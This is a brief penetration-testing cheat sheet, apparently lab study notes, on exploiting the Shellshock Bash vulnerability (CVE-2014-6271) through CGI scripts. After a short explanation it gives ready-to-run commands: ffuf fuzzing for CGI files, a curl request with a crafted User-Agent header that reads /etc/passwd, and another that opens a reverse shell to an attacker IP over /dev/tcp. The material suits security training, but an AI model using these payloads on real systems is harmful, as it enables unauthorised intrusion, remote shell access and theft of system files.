# CGI Attacks
Perhaps the most well-known CGI attack is exploiting the Shellshock (aka, "Bash bug") vulnerability via CGI. The Shellshock vulnerability (CVE-2014-6271) was discovered in 2014, is relatively simple to exploit, and can still be found in the wild (during penetration tests) from time to time. It is a security flaw in the Bash shell (GNU Bash up until version 4.3) that can be used to execute unintentional commands using environment variables.

```bash
$ ffuf -u http://10.129.205.27/cgi-bin/FUZZ.cgi -w /usr/share/wordlists/dirb/small.txt

# Cat /etc/passwd 
$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi

# Reverse Shell
$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

